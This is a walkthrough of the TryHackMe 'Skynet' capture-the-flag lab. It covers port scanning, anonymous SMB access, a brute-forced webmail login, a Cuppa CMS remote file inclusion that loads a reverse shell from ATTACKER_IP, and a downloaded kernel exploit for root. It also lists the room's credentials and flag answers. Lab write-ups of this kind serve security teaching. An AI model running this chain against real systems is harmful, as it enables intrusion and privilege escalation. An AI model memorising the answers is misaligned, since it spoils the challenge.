## Setup 

We first need to connect to the tryhackme VPN server. You can get more information regarding this by visiting the [Access](https://tryhackme.com/access) page.

I'll be using openvpn to connect to the server. Here's the command:

```shell-session
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance

Performing an `nmap` scan to check for open ports and services:
```shell-session
$ sudo nmap -sS -Pn -vv --top-ports 2000 -oN nmap_scan.txt TARGET_IP

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
110/tcp open  pop3         syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
143/tcp open  imap         syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63

# Performing a service scan:
$ sudo nmap -sV -vv -p22,80,110,139,143,445 -oN service_scan.txt TARGET_IP

PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
110/tcp open  pop3        syn-ack ttl 63 Dovecot pop3d
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        syn-ack ttl 63 Dovecot imapd
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There's a http service running on port 80. If we visit the site using a browser, we're shown a simple search engine:

Using `gobuster` to enumerate any potentially interesting directories:
```shell-session
$ gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 32 -x txt,php,sh,py,phtml,html
...
...

```

From the scan, the `/squirrelmail` location is accessible:

We'll hold onto this information for later use...

Since the samba service allows anonymous logins, we can try to log into the service using `smbclient`:
```shell-session
# Using an empty password...
$ smbclient //TARGET_IP/anonymous
smb: \> ls

Inspecting the contents of `attention.txt`:
```shell-session
$ cat attention.txt         
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

Since we have a username as well as a password-list, we can use burpsuite's intruder to brute force the squirrelmail login:
![](brutelogin.png)

The credentials for accessing the mail-server. (`milesdyson:cyborg007haloterminator`).

> What is Miles password for his emails?
>
> Answer: `cyborg007haloterminator`

One of the emails contains the SMB password for the user `milesdyson`.
```txt
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

Using this password, we can now log into the smb service as miles and get more information to exploit further:
```shell-session
$ smbclient -U milesdyson //TARGET_IP/milesdyson
Password for [WORKGROUP\milesdyson]:

> What is the hidden directory?
>
> Answer: `/45kra24zxs28v3yd`

## Gaining Access

Visiting the hidden directory takes us to the following page:
![](hidden-directory.png)

Using `ffuf` to search for more directories within this one, we quickly find a result:
```shell-session
$ ffuf -u http://TARGET_IP/45kra24zxs28v3yd/FUZZ -t 64 -w /usr/share/seclists/Discovery/Web-Content/common.txt
...
...
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 863ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 863ms]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3027ms]
administrator           [Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 474ms]
index.html              [Status: 200, Size: 418, Words: 45, Lines: 16, Duration: 480ms]
```


visiting the `administrator` directory takes us to a login page:
![]cuppa-login.png)

Using `searchsploit` to search for an exploit yields the following results:
```shell-session
$ searchsploit cuppa                               
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclu | php/webapps/25971.txt
------------------------------------------------------------ ---------------------------------
```

> What is the vulnerability called when you can include a remote file for malicious purposes?
>
> Answer: remote file inclusion

According to the exploit, we can use the `/cuppa/alerts/alertConfigField.php` file and supply it with `urlConfig` parameter to exploit the RFI vulnerability. Starting a http server as well as a listener on our machine, we can remotely include a reverse shell payload to get a working shell:
```shell-session
$ python3 -m http.server 4443
Serving HTTP on 0.0.0.0 port 4443 (http://0.0.0.0:4443/) ...

# Setting up the listener:
$ rlwrap -cAr nc -lvnp 4446

```

Accessing the URL: `http://TARGET_IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://ATTACKER_IP:4443/payload.php` gives us a reverse shell. Using this, we can get the user flag:
```shell-session
www-data@skynet:/$ cd /home/milesdyson/
www-data@skynet:/home/milesdyson$ ls
backups
mail
share
user.txt
www-data@skynet:/home/milesdyson$ cat user.txt
7ce5c2109a40f958099283600a9ae807
```

> What is the user flag?
>
> Answer: `7ce5c2109a40f958099283600a9ae807`

## Privilege Escalation

```shell-session
www-data@skynet:/home/milesdyson$ uname -a
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

For this challenge, I'll be making use of [CVE-2017-16995](https://nvd.nist.gov/vuln/detail/CVE-2017-16995), and [this exploit](https://www.exploit-db.com/exploits/45010)

```shell-session
www-data@skynet:/home/milesdyson$ cd /tmp
www-data@skynet:/tmp$ wget http://ATTACKER_IP:4443/45010.c
...
2022-12-09 13:50:50 (28.2 KB/s) - '45010.c' saved [13728/13728]

www-data@skynet:/tmp$ gcc 45010.c
www-data@skynet:/tmp$ ./a.out
```

The shell is quite unstable now, but it doesn't matter, we can still execute commands and get the root flag:
```shell-session
whoami
root
cat /root/root.txt
3f0372db24753accc7179a282cd6a949
```

> What is the root flag?
>
> Answer: `3f0372db24753accc7179a282cd6a949`
